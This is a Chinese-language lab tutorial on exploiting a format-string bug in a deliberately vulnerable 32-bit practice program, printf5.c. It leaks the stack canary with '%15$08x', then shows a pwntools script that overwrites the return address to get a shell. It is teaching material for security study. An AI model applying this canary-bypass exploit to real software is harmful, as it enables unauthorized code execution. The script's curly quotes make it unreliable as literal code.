一.实例程序printf5.c

编译printnf5.程序，不加PIE保护，要加canary保护编写exp，利用printf的漏洞来突破canary保护，并且覆盖ret地址！

编译：gcc -m32 -no-pie -fstack-protector-all -o printf5 printf5.c

调试：

先回顾一下代码，因为printf没有给格式化字符串，所以就会默认输出esp-0x4的内容。

此时我们再回顾一下canary保护的值在哪里？原来我们上面提到过了，在ebp-0xc里!

查看堆栈：stack 0x20

 

ebp-0xc其实就在上图画线处，我们还可以用命令查看其内容；

p命令显示地址：p $ebp-0xc

我们可以数一下ebp-0xc到esp有多少行，正好是15行（0x3c / 4=15）

 

这里还要了解一个我们上节课提到的string符号说明：%k$p将更改对应顺序，与格式化字符串后的第k个参数进行对应，并以地址形式解析参数值。

由于刚才重新运行的程序呀，canary值当然就变化啦，但地址还没变，可以查看栈看第二次的验证一下：

 

二.编写exp

from pwn import *

p = process(“./printf5”)

p.sendline(“%15$08x”)

canary = p.recv()[:8]

print canary

canary = canary.decode(“hex”)[::-1]#由于是小端序存储所以要倒着读

canary_offset = 8*4#后面read函数的栈总共就12行，第八行是canary,12行是ret

ret_offset = 3*4

exlopit_address = p32(0x080484e6)

payload = canary_offset*’a’ + canary + ret_offset*’a’ + exlopit_address

p.sendline(payload)

p.interactive()

运行后即可获得系统shell:
